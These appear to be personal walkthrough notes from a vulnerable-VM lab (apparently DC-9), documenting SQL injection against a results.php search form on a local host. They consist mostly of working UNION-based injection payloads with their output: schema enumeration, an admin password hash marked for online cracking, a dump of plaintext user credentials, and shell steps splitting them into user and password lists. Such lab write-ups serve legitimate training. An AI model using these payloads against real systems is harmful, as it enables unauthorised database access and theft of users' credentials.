# SQL Injection
is possible on results.php

give results
search=test'or 1=1--'

give no results
search=test'or 1=2--'

payload with output

```plaintext
POST /results.php HTTP/1.1
Host: 192.168.178.55
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://192.168.178.55
Connection: close
Referer: http://192.168.178.55/search.php
Cookie: PHPSESSID=oum89dlvs33n6cq2jvr3utri4q
Upgrade-Insecure-Requests: 1

search=test' UNION ALL SELECT 1,2,3,4,@@Version,6-- -

```

Output
```
ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 10.3.17-MariaDB-0+deb10u1<br />Email: 6<br/>
```

## Databases

Found databases

```
search=test' UNION select 1,schema_name,3,4,5,6 from INFORMATION_SCHEMA.SCHEMATA-- -
```

![[Pasted image 20210503192825.png]]

## Tables

Tables in user
```
search=test' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema='users'-- -
```

![[Pasted image 20210503192956.png]]

Tables in staff
```
search=test' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6 from INFORMATION_SCHEMA.TABLES where table_schema='Staff'-- -
```

![[Pasted image 20210503193054.png]]


### Columns
Columns in StaffDetails

```
search=test' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6 from INFORMATION_SCHEMA.COLUMNS where table_name='StaffDetails'-- -
```

![[Pasted image 20210503193234.png]]

Columns in UsersTable Staff

```
search=test' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```
![[Pasted image 20210503193359.png]]

Columns in Users Database Table users

```
search=test' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6 from INFORMATION_SCHEMA.COLUMNS where table_schema='users' -- -
```
![[Pasted image 20210503193824.png]]

## Get User

```search=test' UNION SELECT 1,user(),3,4,5,6-- -```

![[Pasted image 20210503194052.png]]


```search=test' UNION select 1, Username, Password, 4,5,6 from Users-- -```

Name: admin 856f5de590ef37314e7c3bdf6f8a66dc
![[Pasted image 20210503194628.png]]

crack the password online

![[Pasted image 20210503195407.png]]



### get other users

```search=test' UNION select 1, username, password, 4,5,6 from users.UserDetails-- -```

```html
				ID: 1<br/>Name: marym 3kfs86sfd<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: julied 468sfdfsd2<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: fredf 4sfd87sfd1<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: barneyr RocksOff<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: tomc TC&TheBoyz<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: jerrym B8m#48sd<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: wilmaf Pebbles<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: bettyr BamBam01<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: chandlerb UrAG0D!<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: joeyt Passw0rd<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: rachelg yN72#dsd<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: rossg ILoveRachel<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: monicag 3248dsds7s<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: phoebeb smellycats<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: scoots YR3BVxxxw87<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: janitor Ilovepeepee<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: 1<br/>Name: janitor2 Hawaii-Five-0<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>



```

## optimise user database output from html

Vim replacements
```bash
:%s/<br\/><br\/>/\r/g
:%s/ID: 1<br\/>Name: //g
:%s/:<br\/>Position: //g
:%s/<br\/ >Phone No: 5<br \/>Email: 6//g
:%s/ : /:/g
```


## seperate user from pass

```bash
──(kalium㉿kali)-[~/dc9]
└─$ cat userPass.txt| awk -F ':' '{print $1}' > user.txt

┌──(kalium㉿kali)-[~/dc9]
└─$ cat userPass.txt| awk -F ':' '{print $2}' > pass.txt
```

![[Pasted image 20210505183952.png]]